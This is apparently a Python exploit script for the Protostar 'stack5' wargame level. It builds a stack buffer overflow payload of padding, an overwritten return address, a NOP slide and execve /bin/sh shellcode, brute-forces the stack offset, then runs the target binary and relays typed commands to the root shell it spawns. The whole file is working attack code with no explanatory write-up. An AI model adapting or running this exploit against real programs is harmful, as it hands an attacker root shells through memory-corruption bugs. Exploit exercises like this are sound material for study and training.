from subprocess import PIPE, Popen, call
import os.path
import sys
import struct
from time import sleep


# ============================= make_exploit =============================
def make_exploit(offset):
    """This is our BOF input"""

    padding = b'AAAA'*19
    eip = struct.pack('I', 0xbffff7bc + int(offset /2)) # relativo, algum lugar para baixo do stack 
    nopslide = b'\x90'*offset

    # shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
    payload = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

    exploit = (padding + eip + nopslide + payload)
    return exploit


# ============================= print_exploit =============================
def print_exploit(exploit):
    """Prints a representation of the exploit input"""

    cont = 0
    sys.stdout.write('='*20 + 'Exploit' + '='*20 + '\n')
    while cont < len(exploit):
        sys.stdout.write('{0:<8}: '.format(hex(cont) ))
        sys.stdout.write(' '.join( [x for x in exploit[cont:cont+16]] ) + '\n')
        cont += 0x10
    sys.stdout.write('='*47 + '\n\n')


# ============================= save_exploit =============================
def save_exploit(exploit_filename, exploit, _print=False):
    """Saves exploit input data to a file at the same directory of this script (__file__)"""

    if _print:
        print('\n[X] Saving: {0}...\n'.format(exploit_filename))
        print_exploit(exploit)

    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'wb') as exploit_file:
        exploit_file.write(exploit)


# ============================= searching =============================
def searching(max_offset):
    """deals with variation of the stack, returns the right offset. 
    We have to do this, because we are writing into the stack and the stack is not reliable..."""

    for offset in range(1, max_offset):
        exploit = make_exploit(offset)
        save_exploit(exploit_filename, exploit)

        cli = level_path
        dir_path = os.path.dirname('./' + sys.argv[0])
        full_path = dir_path + '/' + exploit_filename
        with open(full_path, 'rb') as exploit_file:
            returncode = call(cli, shell=True, stdin=exploit_file, stdout=PIPE, stderr=PIPE)
        sys.stdout.write('Return Code: {0}  \r'.format(returncode))
        sys.stdout.flush()
        if returncode == 0:
            break
    
    return offset


# ============================= evil =============================
def evil(exploit_filename, level_path):
    """call level_path and run the exploit"""

    print('\n[X] Exploiting: {0}\n'.format(level_path))
    cli = level_path
    dir_path = os.path.dirname('./' + sys.argv[0])
    full_path = dir_path + '/' + exploit_filename
    with open(full_path, 'rb') as exploit_file:
        process = Popen(cli, shell=True, stdin=PIPE)
        process.stdin.write(exploit_file.read() + '\n')
    
    sleep(0.1)
    print('[X] Executing /bin/sh as root\n')
    while True:
        sleep(0.001)
        try:
            input_data = raw_input('> ')
            process.stdin.write(input_data + '\n')
        except KeyboardInterrupt:
            print("\tKeyboardInterrupt")
            break
    process.kill()
    return process.returncode


# ============================= S T A R T =============================
if __name__ == '__main__':
    exploit_filename = 'exploit_stack5'
    level_path = '/opt/protostar/bin/stack5'
    max_offset = 500
    try:
        if sys.argv[1] == '-s' or sys.argv[1] == '--save':
            exploit = make_exploit(int(sys.argv[2]))
            save_exploit(exploit_filename, exploit, True)
        else:
            print('Error: bad option.\
            \n\n\trun:\n\t{0} [-s | --save]\    # to save exploit file\n'.format(sys.argv[0]))

            print('\tor just run: \n\t{0}    # to exploit `{1}`\n'.format(sys.argv[0], level_path))
    except:
        offset = searching(max_offset)
        if offset is not False:
            exploit = make_exploit(offset)
            save_exploit(exploit_filename, exploit, True)
            print('offset: {0}'.format(offset))
            evil(exploit_filename, level_path)
        else:
            print('offset out of range max_offset: {0}, change it in source code'.format(max_offset))
